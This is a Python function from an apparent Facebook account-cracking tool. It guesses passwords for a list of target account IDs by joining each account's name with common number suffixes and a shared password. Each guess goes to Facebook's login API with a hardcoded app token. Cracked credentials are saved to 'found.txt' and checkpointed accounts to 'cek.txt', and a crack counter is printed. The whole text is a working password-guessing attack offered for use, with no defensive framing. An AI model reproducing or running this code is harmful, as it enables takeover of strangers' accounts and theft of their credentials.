```python
def attk(self,idd,name):
	try:
		lid=[name+'123',name+'12345',name+'123456',name.lower()+'123',name.lower()+'12345',name.lower()+'123456',self.spas]
		for x in lid:
			data={'user':idd,'pw':x}
			re=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			jss=json.loads(re.text)
			if 'access_token' in jss.keys():
				self.fnd+=1
				pen=open('result/found.txt','a')
				pen.write(f'{idd}|{x}\n')
				pen.close()
				for i in open('result/found.txt','r').read().splitlines()[-1:]: print("\r\033[92m[FOUND]\033[97m %s               "%(i))
				break
			elif 'User must verify their account on www.facebook.com (405)' in jss['error_msg']:
				self.cek+=1
				pen=open('result/cek.txt','a')
				pen.write(f'{idd}|{x}\n')
				pen.close()
				for i in open('result/cek.txt','r').read().splitlines()[-1:]: print("\r\033[93m[CHECKPOINT]\033[97m %s               "%(i))
				break
		self.hit+=1
		print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
	except: pass
```